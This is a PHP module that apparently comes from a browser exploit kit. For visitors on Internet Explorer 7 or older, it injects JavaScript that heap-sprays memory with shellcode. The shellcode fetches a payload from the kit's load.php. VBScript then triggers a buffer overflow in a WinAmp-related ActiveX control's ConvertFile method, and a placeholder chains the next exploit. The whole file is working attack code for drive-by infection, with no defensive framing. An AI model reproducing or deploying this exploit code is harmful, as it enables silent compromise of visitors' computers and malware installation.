<?php

if ($UAinfo['browser'] == "MSIE" AND $UAinfo['browser_version'] <= 7){
	$expname = "aolwinamp";
	$exploits[] = "
	function aolwinamp(){
		try {
			var obj = document.createElement('object');
			document.body.appendChild(obj);
			obj.id = 'IWinAmpActiveX';
			obj.width = '1';
			obj.height = '1';
			obj.data = './directshow.php';
			obj.classid = 'clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
			var shellcode = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=3") . "\");
			var bigblock  = unescape(\"%u0c0c%u0c0c\");
			var headersize = 20;
			var slackspace = headersize + shellcode.length;
			while (bigblock.length<slackspace) bigblock+=bigblock;
			var fillblock = bigblock.substring(0, slackspace);
			var block = bigblock.substring(0, bigblock.length-slackspace);
			while(block.length+slackspace<0x40000) block = block+block+fillblock;
			var memory = new Array();
			for (var i = 0; i < 666; i++){
				memory[i] = block+shellcode;
			}
			document.write('<SCRIPT language=\"VBScript\">');
			document.write('bof=string(1400,unescape(\"%ff\")) + string(1000,unescape(\"%0c\"))');
			document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
			document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
			document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
			document.write('IWinAmpActiveX.ConvertFile bof,1,1,1,1,1');
			document.write('</SCRIPT>');
		} catch(e) {}
		%NextExploit%
	}
	";
}


?>